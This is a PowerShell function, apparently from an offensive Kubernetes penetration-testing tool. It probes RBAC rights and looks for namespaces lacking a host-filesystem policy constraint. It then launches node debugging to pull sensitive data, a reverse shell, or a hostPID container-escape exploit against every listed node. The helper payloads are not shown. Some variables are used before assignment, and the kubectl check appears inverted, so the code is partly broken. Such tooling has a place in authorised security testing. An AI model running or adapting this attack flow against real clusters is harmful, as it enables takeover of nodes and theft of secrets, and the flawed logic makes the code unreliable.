Function Test-ExploitabilityToNode {
    [CmdletBinding(SupportsShouldProcess=$true,ConfirmImpact="High")]
    param(
        [Parameter(Mandatory = $false)]
        [Alias("t")]
        [string]$access_token = "nvt"
    )
    # Ensure kubectl is available
    if (Test-KubectlInstalledInPath) {
        exit
    }

    if($PSCmdlet.ShouldProcess("Trying to exploitation to node")){
        Write-Host "Starting to Analyze"
        #validate if there is no constraint implemented for host mounting:
            # Define an array with the actions and resources to check
        $actionResourcePairs = @(
            @{ Action = "create"; Resource = "pods" },
            @{ Action = "get"; Resource = "nodes/debug" },
            @{ Action = "exec"; Resource = "pods" },
            @{ Action = "get"; Resource = "nodes" }

        )
        $AllowedNamespaces = Get-NamespaceWhereAllActionsAreAllowed -ActionResourcePairs $actionResourcePairs
        #checking if there are constraints
        Write-Host "Validating for the HostMountFile system constraint and if we can possible bypass it"
        $namespacesWithoutConstraint = Validate-ConstraintAction -ConstraintName "K8sAzureV3HostFilesystem" -EnforcementAction "deny" -NamespacesToCheck $AllowedNamespaces

        if($namespacesWithoutConstraint){
            Write-Host "It looks like we should be allowed to debug the node, Do you want to perform this action or do you want another action to be performed?"            
            $yesOrNo = Get-YesOrNoInput
            if($yesOrNo){
                Get-SensitiveInformationFromNode -namespace $namespacesWithoutConstraint
                return;
            }
            Write-Host "going for other methods scanning"
        } 
        else {
            Write-Host "It looks like we aren't able to debug the node directly trying other methods"
        }
        

        # Define an array with the actions and resources to check
        $CanICreatePodAnywhere = Get-FirstitemWhereICanCreateOrExecInANamespace
        Write-Host validate:$CanICreatePodAnywhere
        if (-not $CanICreatePodAnywhere -or $CanICreatePodAnywhere.Count -eq 0) {
            Write-Host $CanICreatePodAnywhere
            Write-Host "There isn't a namespace where we can create, a pod anywhere on the system"
            return; 
        }
        if($CanICreatePodAnywhere[0].ExecAllowed -eq $False){
            if($CanICreatePodAnywhere[0].DeleteAllowed -eq $false){
                Write-Host "Important to know we don't have delete rights so the actions you perform are perminant"
            }
            Write-Host "It looks like we can only use the create option on $cleanNamespace on resource $action"
            Perform-Reverseshell -resource $action -namespace $cleanNamespace
        }   
        if($CanICreatePodAnywhere[0].ExecAllowed -eq $True){
            if( $CanICreatePodAnywhere[0].DeleteAllowed -eq $false){
                 Write-Host "we can't perform an delete statement on the  ${CanICreatePodAnywhere[0].ActionResource} do you still whish to continue? 
                             (this results in that the pod will stay in the system. and you have No ability to delete the pod. without help from others"
                $yesOrNo = Get-YesOrNoInput
                if(-not $yesOrNo){
                    return;
                }
            }
            $cleanNamespace = $CanICreatePodAnywhere[0].Namespace
            $action = $CanICreatePodAnywhere[0].ActionResource
            Write-Host "Looks like we can execute the action $action a pod and create it will be deployed on namespace $cleanNamespace"
            Write-Host "Trying to retrieve all nodes to force deployment on all nodes"
            $result = kubectl auth can-i get node
            if($result -eq "yes"){
                $nodes = kubectl get nodes -o 'jsonpath={.items[*].metadata.name}' 
                $nodes = $nodes -split " "
                foreach($node in $nodes){
                    Write-Host found the following nodes:
                    Write-Host $node
                    Perform-HostPidExploit -namespace $cleanNamespace -node $node -resource $action
                }
            }
            else {
                Write-Host "Not allowed to list nodes, performing action on a random node."
                Perform-HostPidExploit -namespace $cleanNamespace -resource $action
            }
        }

    }
}
